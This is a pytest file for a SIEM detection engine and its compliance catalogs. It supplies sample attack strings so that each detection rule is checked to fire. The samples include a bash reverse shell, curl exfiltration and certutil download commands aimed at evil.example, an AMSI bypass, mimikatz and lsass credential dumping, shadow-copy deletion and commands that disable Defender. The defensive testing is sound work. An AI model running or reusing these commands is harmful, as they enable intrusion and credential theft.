import pytest

from app.utils.compliance_catalog import COMPLIANCE_CATALOG, get_rule_by_event_id
from app.utils.siem_catalog import SIEM_RULES
from app.utils.siem_logic import SIEMEngine
from app.workers.fbr_worker import (
    _build_watch_ids as build_fbr_watch_ids,
    _extract_fbr_source_ip,
    _is_fbr_rollup_candidate,
    _resolve_fbr_fim_threshold,
    _seal_fbr_rollup_summary,
)


SIEM_RULE_SAMPLES = {
    "SQL_INJECTION": ("http_request", "GET /login?id=1' union select password from users --"),
    "SIEM-FW-001": ("Windows-Sec", "Windows firewall connection blocked 5157 inbound traffic"),
    "XSS_ATTACK": ("http_request", "GET /search?q=<script>alert(1)</script> HTTP/1.1"),
    "COMMAND_INJECTION": ("command_line", "input=ok; whoami"),
    "PATH_TRAVERSAL": ("http_request", "GET /download?file=../../../etc/passwd"),
    "POWERSHELL_OBFUSCATION": ("powershell", "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
    "POWERSHELL_B64_OBFUSCATION": ("powershell", "powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
    "AMSI_BYPASS": ("powershell", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"),
    "PRIVILEGE_ESCALATION": ("command_line", "net localgroup administrators attacker /add"),
    "LATERAL_MOVEMENT": ("command_line", "net use \\\\server01\\c$ /user:corp\\admin"),
    "LOG_EVASION": ("command_line", "wevtutil cl Security"),
    "REVERSE_SHELL": ("command_line", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    "RECON_COMMANDS": ("command_line", "ipconfig /all discovery command"),
    "PERSISTENCE": ("command_line", "schtasks /create /tn updater /tr malware.exe"),
    "DATA_EXFILTRATION": ("command_line", "curl -d @secret.txt http://evil.example/upload"),
    "STAGING": ("command_line", "tar -czf /tmp/archive.tgz /home/accounting"),
    "BRUTE_FORCE_PATTERN": ("failed_login", "failed password for root from 10.0.0.8"),
    "XXE_INJECTION": ("http_request", "<!DOCTYPE foo SYSTEM \"file:///etc/passwd\">"),
    "MALWARE_EXECUTION": ("process_create", "mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
    "SIGMA_RANSOMWARE_SHADOW_DELETE": ("process_create", "vssadmin.exe delete shadows /all /quiet"),
    "SIGMA_CREDENTIAL_DUMPING": ("process_create", "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp"),
    "DEFENSE_EVASION_DEFENDER": ("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true"),
    "LOLBIN_DOWNLOADER": ("process_create", "certutil -urlcache -split -f http://evil.example/a.exe a.exe"),
    "LINUX_SYSTEM_TIMESTOMPING": ("linux_auth", "touch -t 202501010101 /tmp/payload"),
    "WEB_SHELL_ACTIVITY": ("http_request", "cmd.exe /c dir C:\\inetpub\\wwwroot HTTP/1.1"),
}


@pytest.mark.asyncio
@pytest.mark.parametrize("rule_name", sorted(SIEM_RULES["detection"]["rules"]))
async def test_every_siem_regex_rule_fires(rule_name):
    missing_samples = set(SIEM_RULES["detection"]["rules"]) - set(SIEM_RULE_SAMPLES)
    assert not missing_samples, f"Missing SIEM rule samples: {sorted(missing_samples)}"

    event_type, message = SIEM_RULE_SAMPLES[rule_name]
    engine = SIEMEngine(SIEM_RULES)
    findings = await engine.analyze_single_log(
        {
            "tenant_id": "TENANT-CONTRACT",
            "source_ip": "10.99.0.5",
            "event_type": event_type,
            "message": message,
            "user": "contract_user",
        }
    )

    assert any(finding["type"] == rule_name for finding in findings), (
        f"{rule_name} did not fire. Findings: {[finding['type'] for finding in findings]}"
    )


def test_peca_and_fbr_catalogs_are_complete_and_disjoint():
    peca_ids = {str(rule["event_id"]) for rule in COMPLIANCE_CATALOG["peca_forensic"]["rules"]}
    fbr_ids = {str(rule["event_id"]) for rule in COMPLIANCE_CATALOG["fbr_pos"]["rules"]}

    assert len(peca_ids) == 11
    assert len(fbr_ids) == 8
    assert "4625" in peca_ids
    assert "1102" in peca_ids
    assert "1100" in peca_ids
    assert "4688" in peca_ids
    assert "7045" in peca_ids
    assert "FBR-INV-DEL" in fbr_ids
    assert "FBR-INV-MOD" in fbr_ids
    assert "FIM-DB-MOD" in fbr_ids
    assert "4660" in fbr_ids
    assert "4625" not in fbr_ids
    assert "FBR-INV-DEL" not in peca_ids


def test_compliance_rule_lookup_routes_each_event_to_expected_pack():
    for rule in COMPLIANCE_CATALOG["peca_forensic"]["rules"]:
        pack, matched = get_rule_by_event_id(rule["event_id"])
        assert pack == "peca_forensic"
        assert matched["id"] == rule["id"]

    for rule in COMPLIANCE_CATALOG["fbr_pos"]["rules"]:
        pack, matched = get_rule_by_event_id(rule["event_id"])
        assert pack == "fbr_pos"
        assert matched["id"] == rule["id"]

    pack, matched = get_rule_by_event_id("999999")
    assert pack is None
    assert matched is None


def test_fbr_worker_watch_ids_match_catalog_and_shared_framework_map():
    watch_ids = build_fbr_watch_ids(SIEM_RULES | {"compliance_frameworks": COMPLIANCE_CATALOG})
    expected = {str(rule["event_id"]) for rule in COMPLIANCE_CATALOG["fbr_pos"]["rules"]}

    assert expected <= watch_ids
    assert "FBR-INV-DEL" in watch_ids
    assert "FBR-INV-MOD" in watch_ids
    assert "FIM-DB-MOD" in watch_ids
    assert "4625" not in watch_ids


def test_tuned_siem_threshold_contracts():
    auth_rules = SIEM_RULES["stateful_detection_rules"]["auth_identity"]
    phishing = SIEM_RULES["detection"]["phishing_detection"]

    assert auth_rules["password_spraying"]["threshold_users"] == 5
    assert auth_rules["password_spraying"]["window_seconds"] == 300
    assert auth_rules["ghost_admin_sequence"]["window_seconds"] == 300
    assert auth_rules["impossible_travel"]["min_distance_km"] == 500
    assert auth_rules["impossible_travel"]["max_travel_time_hours"] == 2
    assert phishing["score_threshold"] == 40
    assert phishing["minimum_signals"] == 2
    assert phishing["weights"]["lolbin_execution"] == 50


def test_event_map_routes_logging_shutdown_and_service_install_to_peca():
    event_map = SIEM_RULES["event_id_map"]

    assert event_map["1100"]["severity"] == "CRITICAL"
    assert event_map["1100"]["frameworks"] == ["peca_forensic"]
    assert event_map["7045"]["severity"] == "CRITICAL"
    assert "peca_forensic" in event_map["7045"]["frameworks"]
    assert "fbr_pos" not in event_map["7045"]["frameworks"]
    assert event_map["FIM-DB-MOD"]["severity"] == "CRITICAL"
    assert event_map["FIM-DB-MOD"]["frameworks"] == ["fbr_pos"]


def test_fbr_rollup_source_threshold_and_integrity_helpers():
    log_data = {
        "source_ip": "192.168.1.20",
        "processed_data": {"source_network_address": "10.20.30.40"},
    }
    summary = {
        "tenant_id": "TENANT-FBR",
        "source_ip": _extract_fbr_source_ip(log_data),
        "window_count": 51,
        "threshold": _resolve_fbr_fim_threshold({}),
        "event": "MASS_FILE_MODIFICATION_DETECTED",
    }

    assert _extract_fbr_source_ip(log_data) == "10.20.30.40"
    assert _extract_fbr_source_ip({"source_ip": "unknown"}) == "unknown"
    assert _resolve_fbr_fim_threshold({}) == 50
    assert _resolve_fbr_fim_threshold({"fbr_threshold": 15}) == 15
    assert not _is_fbr_rollup_candidate("4663")
    assert _is_fbr_rollup_candidate("FIM-DB-MOD")
    assert not _is_fbr_rollup_candidate("4660")
    assert not _is_fbr_rollup_candidate("FBR-INV-DEL")
    assert not _is_fbr_rollup_candidate("FBR-INV-MOD")

    sealed = _seal_fbr_rollup_summary(summary)
    assert sealed["integrity_algorithm"] == "SHA-256-CANONICAL-JSON"
    assert len(sealed["integrity_seal"]) == 64
    assert sealed["integrity_seal"] == _seal_fbr_rollup_summary(summary)["integrity_seal"]
